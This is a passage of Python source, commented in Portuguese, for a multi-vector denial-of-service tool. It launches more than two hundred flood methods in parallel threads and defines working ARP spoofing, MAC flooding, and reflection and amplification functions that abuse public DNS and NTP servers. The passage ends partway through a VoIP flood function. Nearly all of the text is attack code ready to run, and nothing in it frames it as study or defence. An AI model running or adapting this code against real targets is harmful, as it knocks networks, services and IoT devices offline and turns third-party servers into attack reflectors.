    # Lista de todos os ataques do seu código
    all_attack_methods = [
        # Parte 1 e 3 - Ataques a Sites (HTTP)
        (start_attack, (slowloris, target, port, proxies, agents, duration)),
        (start_attack, (rudy_attack, target, port, proxies, agents, duration)),
        (start_attack, (http_multi_method_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_keepalive_flood, target, port, proxies, agents, duration)),
        (start_attack, (slow_read, target, port, proxies, agents, duration)),
        (start_attack, (http_header_overload, target, port, proxies, agents, duration)),
        (start_attack, (http_random_path_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_burst_multi_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_get_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_post_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_head_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_options_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_trace_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_put_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_delete_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_connect_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_patch_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_get_mass_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_post_burst_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_get_random_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_post_random_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_head_mass_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_options_burst_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_trace_mass_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_put_random_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_delete_burst_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_connect_random_flood, target, port, proxies, agents, duration)),
        (start_attack, (http_patch_burst_flood, target, port, proxies, agents, duration)),

        # Parte 6 - Ataques a Dispositivos
        (start_attack_no_port, (sip_flood, target, duration)),
        (start_attack_no_port, (coap_flood, target, duration)),
        (start_attack_no_port, (mqtt_flood, target, duration)),
        (start_attack_no_port, (telnet_flood, target, duration)),
        (start_attack_no_port, (sip_burst_flood, target, duration)),
        (start_attack_no_port, (coap_mass_flood, target, duration)),
        (start_attack_no_port, (mqtt_burst_flood, target, duration)),
        (start_attack_no_port, (telnet_mass_flood, target, duration)),
        (start_attack_no_port, (sip_random_flood, target, duration)),
        (start_attack_no_port, (coap_burst_flood, target, duration)),
        (start_attack_no_port, (mqtt_mass_flood, target, duration)),
        (start_attack_no_port, (telnet_burst_flood, target, duration)),
        (start_attack_no_port, (sip_mass_flood, target, duration)),
        (start_attack_no_port, (coap_random_flood, target, duration)),
        (start_attack_no_port, (mqtt_random_flood, target, duration)),
        (start_attack_no_port, (telnet_random_flood, target, duration)),
        (start_attack_no_port, (upnp_flood, target, duration)),
        (start_attack_no_port, (snmp_flood, target, duration)),
        (start_attack_no_port, (upnp_burst_flood, target, duration)),
        (start_attack_no_port, (snmp_mass_flood, target, duration)),
        (start_attack_no_port, (sip_high_rate_flood, target, duration)),
        (start_attack_no_port, (coap_high_rate_flood, target, duration)),
        (start_attack_no_port, (mqtt_high_rate_flood, target, duration)),
        (start_attack_no_port, (telnet_high_rate_flood, target, duration)),

        # Parte 7 - Ataques de Rede Local e Reflexões
        (start_attack_gateway, (arp_spoof, target, gateway_ip, duration) if gateway_ip else None),
        (start_attack_interface, (mac_flood, interface, duration) if interface else None),
        (start_attack_gateway, (arp_burst_spoof, target, gateway_ip, duration) if gateway_ip else None),
        (start_attack_interface, (mac_mass_flood, interface, duration) if interface else None),
        (start_attack_gateway, (arp_random_spoof, target, gateway_ip, duration) if gateway_ip else None),
        (start_attack_interface, (mac_burst_flood, interface, duration) if interface else None),
        (start_attack_gateway, (arp_high_rate_spoof, target, gateway_ip, duration) if gateway_ip else None),
        (start_attack_interface, (mac_high_rate_flood, interface, duration) if interface else None),
        (start_attack_no_port, (dns_reflection, target, duration)),
        (start_attack_no_port, (ntp_reflection, target, duration)),
        (start_attack_no_port, (ssdp_reflection, target, duration)),
        (start_attack_no_port, (snmp_reflection, target, duration)),
        (start_attack_no_port, (dns_burst_reflection, target, duration)),
        (start_attack_no_port, (ntp_mass_reflection, target, duration)),
        (start_attack_no_port, (ssdp_burst_reflection, target, duration)),
        (start_attack_no_port, (snmp_mass_reflection, target, duration)),
        (start_attack_no_port, (dns_high_rate_reflection, target, duration)),
        (start_attack_no_port, (ntp_burst_reflection, target, duration)),
        (start_attack_no_port, (ssdp_high_rate_reflection, target, duration)),
        (start_attack_no_port, (snmp_burst_reflection, target, duration)),

        # Parte 2 - Ataques a IPs (TCP)
        (start_tcp_attack, (syn_flood, target, port, duration)),
        (start_tcp_attack, (tcp_rst_flood, target, port, duration)),
        (start_tcp_attack, (tcp_fin_flood, target, port, duration)),
        (start_tcp_attack, (tcp_ack_flood, target, port, duration)),
        (start_tcp_attack, (tcp_psh_flood, target, port, duration)),
        (start_tcp_attack, (tcp_xmas_flood, target, port, duration)),
        (start_tcp_attack, (tcp_null_flood, target, port, duration)),
        (start_tcp_attack, (tcp_land_flood, target, port, duration)),

        # Parte 5 - Ataques ICMP e Amplificação
        (start_attack_no_port, (icmp_flood, target, duration)),
        (start_attack_broadcast, (icmp_smurf, target, broadcast_ip, duration) if broadcast_ip else None),
        (start_attack_no_port, (icmp_ping_flood, target, duration)),
        (start_attack_no_port, (icmp_burst_flood, target, duration)),
        (start_attack_no_port, (icmp_mass_flood, target, duration)),
        (start_attack_no_port, (icmp_random_flood, target, duration)),
        (start_attack_broadcast, (icmp_smurf_burst, target, broadcast_ip, duration) if broadcast_ip else None),
        (start_attack_no_port, (dns_amplification, target, duration)),
        (start_attack_no_port, (ntp_amplification, target, duration)),
        (start_attack_no_port, (ssdp_amplification, target, duration)),
        (start_attack_no_port, (snmp_amplification, target, duration)),
        (start_attack_no_port, (cldap_amplification, target, duration)),
        (start_attack_no_port, (memcached_amplification, target, duration)),
        (start_attack_no_port, (ldap_amplification, target, duration)),
        (start_attack_no_port, (chargen_amplification, target, duration)),
        (start_attack_no_port, (qotd_amplification, target, duration)),
        (start_attack_no_port, (dns_burst_amplification, target, duration)),
        (start_attack_no_port, (ntp_mass_amplification, target, duration)),
        (start_attack_no_port, (ssdp_mass_amplification, target, duration)),
        (start_attack_no_port, (snmp_burst_amplification, target, duration)),
        (start_attack_no_port, (cldap_mass_amplification, target, duration)),
        (start_attack_no_port, (memcached_burst_amplification, target, duration)),
        (start_attack_no_port, (ldap_burst_amplification, target, duration)),

        # Parte 8 - Ataques a Serviços
        (start_attack_no_port, (ftp_flood, target, duration)),
        (start_attack_no_port, (smtp_flood, target, duration)),
        (start_attack_no_port, (dns_service_flood, target, duration)),
        (start_attack_no_port, (ssh_flood, target, duration)),
        (start_attack_no_port, (http_service_flood, target, duration)),
        (start_attack_no_port, (ftp_burst_flood, target, duration)),
        (start_attack_no_port, (smtp_mass_flood, target, duration)),
        (start_attack_no_port, (dns_service_burst_flood, target, duration)),
        (start_attack_no_port, (ssh_mass_flood, target, duration)),
        (start_attack_no_port, (http_service_mass_flood, target, duration)),
        (start_attack_no_port, (ftp_random_flood, target, duration)),
        (start_attack_no_port, (smtp_burst_flood, target, duration)),
        (start_attack_no_port, (dns_service_mass_flood, target, duration)),
        (start_attack_no_port, (ssh_burst_flood, target, duration)),
        (start_attack_no_port, (http_service_burst_flood, target, duration)),
        (start_attack_no_port, (ftp_high_rate_flood, target, duration)),
        (start_attack_no_port, (smtp_random_flood, target, duration)),
        (start_attack_no_port, (dns_service_high_rate_flood, target, duration)),
        (start_attack_no_port, (ssh_random_flood, target, duration)),
        (start_attack_no_port, (http_service_random_flood, target, duration)),
        (start_attack_no_port, (pop3_flood, target, duration)),
        (start_attack_no_port, (imap_flood, target, duration)),
        (start_attack_no_port, (pop3_burst_flood, target, duration)),
        (start_attack_no_port, (imap_mass_flood, target, duration)),

        # Parte 9 - Ataques IoT
        (start_attack_no_port, (coap_burst_flood_iot, target, duration)),
        (start_attack_no_port, (mqtt_mass_flood_iot, target, duration)),
        (start_attack_no_port, (coap_mass_flood_iot, target, duration)),
        (start_attack_no_port, (mqtt_burst_flood_iot, target, duration)),
        (start_attack_no_port, (coap_random_flood_iot, target, duration)),
        (start_attack_no_port, (mqtt_random_flood_iot, target, duration)),
        (start_attack_no_port, (coap_high_rate_flood_iot, target, duration)),
        (start_attack_no_port, (mqtt_high_rate_flood_iot, target, duration)),
        (start_attack_no_port, (iot_ssdp_flood, target, duration)),
        (start_attack_no_port, (iot_ssdp_burst_flood, target, duration)),
        (start_attack_no_port, (iot_snmp_flood, target, duration)),
        (start_attack_no_port, (iot_snmp_mass_flood, target, duration)),
        (start_attack_no_port, (coap_mass_burst_flood, target, duration)),

        # Parte 9 - Ataques VoIP
        (start_attack_no_port, (sip_high_rate_flood_voip, target, duration)),
        (start_attack_no_port, (h323_flood, target, duration)),
        (start_attack_no_port, (sip_mass_flood_voip, target, duration)),
        (start_attack_no_port, (h323_burst_flood, target, duration)),
        (start_attack_no_port, (sip_random_flood_voip, target, duration)),
        (start_attack_no_port, (h323_mass_flood, target, duration)),
        (start_attack_no_port, (rtp_flood, target, duration)),
        (start_attack_no_port, (rtp_mass_flood, target, duration)),
        (start_attack_no_port, (rtp_burst_flood, target, duration)),
        (start_attack_no_port, (sip_random_burst_flood, target, duration)),
        (start_attack_no_port, (h323_random_flood, target, duration)),

        # Parte 10 - Ataques Híbridos
        (start_attack, (hybrid_http_udp_flood, target, port, proxies, agents, duration)),
        (start_attack, (hybrid_tcp_http_flood, target, port, proxies, agents, duration)),
        (start_attack_no_port, (hybrid_icmp_udp_flood, target, duration)),
        (start_attack, (hybrid_http_sip_flood, target, port, proxies, agents, duration)),
        (start_attack_no_port, (hybrid_udp_coap_flood, target, duration)),
        (start_attack_no_port, (hybrid_tcp_mqtt_flood, target, duration)),
        (start_attack, (hybrid_http_udp_burst_flood, target, port, proxies, agents, duration)),
        (start_attack_no_port, (hybrid_tcp_sip_flood, target, duration)),
        (start_attack_no_port, (hybrid_udp_rtp_flood, target, duration)),
        (start_attack_no_port, (hybrid_icmp_coap_flood, target, duration)),

        # Parte 10 - Ataques Exóticos
        (start_attack_no_port, (gre_flood, target, duration)),
        (start_attack_no_port, (ip_fragment_flood, target, duration)),
        (start_attack_no_port, (chargen_flood, target, duration)),
        (start_attack_no_port, (qotd_flood, target, duration)),
        (start_attack_no_port, (gre_burst_flood, target, duration)),
        (start_attack_no_port, (ip_fragment_mass_flood, target, duration)),
        (start_attack_no_port, (chargen_burst_flood, target, duration)),
        (start_attack_no_port, (qotd_mass_flood, target, duration)),
        (start_attack_no_port, (gre_mass_flood, target, duration)),
        (start_attack_no_port, (ip_fragment_burst_flood, target, duration)),

        # Parte 11 - Ataques UDP
        (start_attack, (udp_flood, target, port, duration)),
        (start_attack_no_port, (udp_stun_flood, target, duration)),
        (start_attack, (udp_fragment_flood, target, port, duration)),
        (start_attack_no_port, (udp_dns_flood, target, duration)),
        (start_attack_no_port, (udp_ntp_flood, target, duration)),
        (start_attack_no_port, (udp_ssdp_flood, target, duration)),
        (start_attack, (udp_mass_flood, target, port, duration)),
        (start_attack_no_port, (udp_random_port_flood, target, duration)),
        (start_attack, (udp_burst_flood, target, port, duration)),
        (start_attack_no_port, (udp_dns_burst_flood, target, duration)),
        (start_attack_no_port, (udp_ntp_mass_flood, target, duration)),
        (start_attack_no_port, (udp_ssdp_burst_flood, target, duration)),
        (start_attack_no_port, (udp_flood_multi_port, target, duration)),
        (start_attack_no_port, (udp_stun_mass_flood, target, duration)),
        (start_attack, (udp_random_payload_flood, target, port, duration)),
        (start_attack_no_port, (udp_dns_random_flood, target, duration)),
        (start_attack_no_port, (udp_ntp_burst_flood, target, duration)),
        (start_attack_no_port, (udp_ssdp_random_flood, target, duration)),
        (start_attack, (udp_flood_high_rate, target, port, duration)),
        (start_attack_no_port, (udp_stun_burst_flood, target, duration)),
        (start_attack, (udp_fragment_mass_flood, target, port, duration)),
        (start_attack_no_port, (udp_dns_mass_flood, target, duration)),
        (start_attack_no_port, (udp_ntp_random_flood, target, duration)),
        (start_attack_no_port, (udp_ssdp_mass_flood, target, duration)),
    ]


    for attack_func, args in all_attack_methods:
        if args:  # Verifica se os argumentos são válidos (ex.: gateway_ip ou interface fornecidos)
            thread = threading.Thread(target=attack_func, args=args)
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + "All Attacks concluído!" + Style.RESET_ALL)

def start_attack_no_port(attack_func, target, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_func, args=(target, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)



# Ataque ARP Spoofing
def arp_spoof(target_ip, gateway_ip, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            target_mac = scapy.getmacbyip(target_ip)
            gateway_mac = scapy.getmacbyip(gateway_ip)
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip) / random._urandom(32768)
            scapy.send(packet, verbose=0)
            packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip) / random._urandom(32768)
            scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ARP-SPOOF] Enviado para {target_ip} e {gateway_ip}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.00001)  # Intervalo ajustado para redes locais

# Ataque MAC Flooding
def mac_flood(interface, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=scapy.RandMAC()) / scapy.IP(dst="255.255.255.255") / scapy.UDP() / random._urandom(65535)
            scapy.sendp(packet, iface=interface, verbose=0)
            print(Fore.GREEN + f"  [MAC-FLOOD] Enviado na interface {interface}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque ARP Burst Spoofing
def arp_burst_spoof(target_ip, gateway_ip, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            target_mac = scapy.getmacbyip(target_ip)
            gateway_mac = scapy.getmacbyip(gateway_ip)
            packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            for _ in range(50):  # Burst de 50 pacotes
                scapy.send(packet1 / random._urandom(16384), verbose=0)
                scapy.send(packet2 / random._urandom(16384), verbose=0)
            print(Fore.GREEN + f"  [ARP-BURST-SPOOF] Enviado para {target_ip} e {gateway_ip}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.00001)

# Ataque MAC Mass Flooding
def mac_mass_flood(interface, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=scapy.RandMAC()) / scapy.IP(dst="255.255.255.255") / scapy.UDP() / (random._urandom(65535) + b"x" * 32768)
            scapy.sendp(packet, iface=interface, verbose=0)
            print(Fore.GREEN + f"  [MAC-MASS-FLOOD] Enviado na interface {interface}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque ARP Random Spoofing
def arp_random_spoof(target_ip, gateway_ip, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            target_mac = scapy.getmacbyip(target_ip)
            gateway_mac = scapy.getmacbyip(gateway_ip)
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}") / random._urandom(32768)
            scapy.send(packet, verbose=0)
            packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}") / random._urandom(32768)
            scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ARP-RANDOM-SPOOF] Enviado para {target_ip} e {gateway_ip}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.00001)

# Ataque MAC Burst Flooding
def mac_burst_flood(interface, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=scapy.RandMAC()) / scapy.IP(dst="255.255.255.255") / scapy.UDP() / random._urandom(32768)
            for _ in range(50):  # Burst de 50 pacotes
                scapy.sendp(packet, iface=interface, verbose=0)
            print(Fore.GREEN + f"  [MAC-BURST-FLOOD] Enviado na interface {interface}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque ARP High Rate Spoofing
def arp_high_rate_spoof(target_ip, gateway_ip, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            target_mac = scapy.getmacbyip(target_ip)
            gateway_mac = scapy.getmacbyip(gateway_ip)
            packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            for _ in range(20):  # 20 pacotes por iteração
                scapy.send(packet1 / random._urandom(16384), verbose=0)
                scapy.send(packet2 / random._urandom(16384), verbose=0)
            print(Fore.GREEN + f"  [ARP-HIGH-RATE-SPOOF] Enviado para {target_ip} e {gateway_ip}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.00001)

# Ataque MAC High Rate Flooding
def mac_high_rate_flood(interface, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=scapy.RandMAC()) / scapy.IP(dst="255.255.255.255") / scapy.UDP() / random._urandom(32768)
            for _ in range(20):  # 20 pacotes por iteração
                scapy.sendp(packet, iface=interface, verbose=0)
            print(Fore.GREEN + f"  [MAC-HIGH-RATE-FLOOD] Enviado na interface {interface}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS Reflection
def dns_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(target, dns.rdatatype.ANY).to_wire() + random._urandom(32768)
            reflector = random.choice(reflectors)
            sock.sendto(payload, (reflector, 53))
            print(Fore.GREEN + f"  [DNS-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque NTP Reflection
def ntp_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["pool.ntp.org", "time.google.com", "time.windows.com"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x17\x00\x03\x2a" + random._urandom(32768)
            reflector = random.choice(reflectors)
            sock.sendto(payload, (reflector, 123))
            sock.sendto(payload, (target, 123))
            print(Fore.GREEN + f"  [NTP-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSDP Reflection
def ssdp_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["192.168.1.1", "10.0.0.1", "172.16.0.1", "239.255.255.250"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n" + random._urandom(32768)
            reflector = random.choice(reflectors)
            sock.sendto(payload, (reflector, 1900))
            sock.sendto(payload, (target, 1900))
            print(Fore.GREEN + f"  [SSDP-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SNMP Reflection
def snmp_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["192.168.1.1", "10.0.0.1", "172.16.0.1"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00" + random._urandom(32768)
            reflector = random.choice(reflectors)
            sock.sendto(payload, (reflector, 161))
            sock.sendto(payload, (target, 161))
            print(Fore.GREEN + f"  [SNMP-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS Burst Reflection
def dns_burst_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(target, dns.rdatatype.ANY).to_wire()
            reflector = random.choice(reflectors)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (reflector, 53))
            print(Fore.GREEN + f"  [DNS-BURST-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque NTP Mass Reflection
def ntp_mass_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["pool.ntp.org", "time.google.com"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x17\x00\x03\x2a" + random._urandom(65535)
            reflector = random.choice(reflectors)
            sock.sendto(payload, (reflector, 123))
            sock.sendto(payload, (target, 123))
            print(Fore.GREEN + f"  [NTP-MASS-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSDP Burst Reflection
def ssdp_burst_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["192.168.1.1", "10.0.0.1"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n"
            reflector = random.choice(reflectors)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (reflector, 1900))
                sock.sendto(payload + random._urandom(16384), (target, 1900))
            print(Fore.GREEN + f"  [SSDP-BURST-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SNMP Mass Reflection
def snmp_mass_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["192.168.1.1", "10.0.0.1"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00" + random._urandom(65535)
            reflector = random.choice(reflectors)
            sock.sendto(payload, (reflector, 161))
            sock.sendto(payload, (target, 161))
            print(Fore.GREEN + f"  [SNMP-MASS-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS High Rate Reflection
def dns_high_rate_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["8.8.8.8", "1.1.1.1"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(target, dns.rdatatype.ANY).to_wire()
            reflector = random.choice(reflectors)
            for _ in range(20):  # 20 pacotes por iteração
                sock.sendto(payload + random._urandom(16384), (reflector, 53))
            print(Fore.GREEN + f"  [DNS-HIGH-RATE-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque NTP Burst Reflection
def ntp_burst_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["pool.ntp.org", "time.windows.com"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x17\x00\x03\x2a" + random._urandom(32768)
            reflector = random.choice(reflectors)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload, (reflector, 123))
                sock.sendto(payload, (target, 123))
            print(Fore.GREEN + f"  [NTP-BURST-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSDP High Rate Reflection
def ssdp_high_rate_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["192.168.1.1", "10.0.0.1"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n"
            reflector = random.choice(reflectors)
            for _ in range(20):  # 20 pacotes por iteração
                sock.sendto(payload + random._urandom(16384), (reflector, 1900))
                sock.sendto(payload + random._urandom(16384), (target, 1900))
            print(Fore.GREEN + f"  [SSDP-HIGH-RATE-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SNMP Burst Reflection
def snmp_burst_reflection(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    reflectors = ["192.168.1.1", "10.0.0.1"]
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"
            reflector = random.choice(reflectors)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (reflector, 161))
                sock.sendto(payload + random._urandom(16384), (target, 161))
            print(Fore.GREEN + f"  [SNMP-BURST-REFLECT] Enviado para {target} via {reflector}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)


# Ataque CoAP Burst Flood (IoT)
def coap_burst_flood_iot(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65"
            for _ in range(100):  # Burst de 100 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 5683))
            print(Fore.GREEN + f"  [COAP-BURST-IOT] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)  # Intervalo ultra baixo

# Ataque MQTT Mass Flood (IoT)
def mqtt_mass_flood_iot(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + random._urandom(65535) + b"x" * 32768  # 96KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [MQTT-MASS-IOT] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SIP High Rate Flood (VoIP)
def sip_high_rate_flood_voip(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n"
            for _ in range(50):  # 50 pacotes por iteração
